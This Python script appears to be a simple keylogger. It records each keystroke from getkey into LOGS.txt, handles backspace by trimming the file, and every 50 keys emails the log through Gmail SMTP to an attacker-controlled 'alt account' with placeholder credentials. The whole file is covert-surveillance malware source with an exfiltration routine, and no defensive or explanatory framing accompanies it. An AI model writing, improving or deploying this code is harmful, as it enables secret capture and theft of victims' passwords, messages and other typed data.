import os, getkey
from getkey import *
import smtplib
from email.mime.text import MIMEText

with open('LOGS.txt', 'r') as file:
    data = file.read() # Opens the file and reads the data

smtp_ssl_host = 'smtp.gmail.com'  # smtp.mail.yahoo.com
smtp_ssl_port = 465 #sets the port for the server
email = 'ENTER_ALT_EMAIL' # Your alt acount's email
password = 'ENTER_PASSWORD' # Password of your alt account
sender = email # sets the sender to your email
target = [email] # Must be a list, can enter other emails

msg = MIMEText(data) # sets the contents of the email
msg['Subject'] = 'logs' # sets the subject
msg['From'] = sender
msg['To'] = ', '.join(target)


timer = 0

def SendMail():
  server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
  msg = MIMEText(data)
  server.login(email, password)
  server.sendmail(sender, target, msg.as_string())
  
while True:

    timer += 1
    print(timer)
    key = getkey()
    L = open('LOGS.txt', "a")
    with open('LOGS.txt') as infile:
      words = 0
      characters = 0
      for lineno, line in enumerate(infile, 1):
        wordslist = line.split()
        words += len(wordslist)
        characters += sum(len(word) for word in wordslist)
    if key == '' and characters != 0:
      with open('LOGS.txt', 'rb+') as filehandle:
        filehandle.seek(-1, os.SEEK_END)
        filehandle.truncate()
    elif key != '':
      L.write(key)
      L.close()
    if timer == 50:
      timer  = 0
      SendMail()
      
    
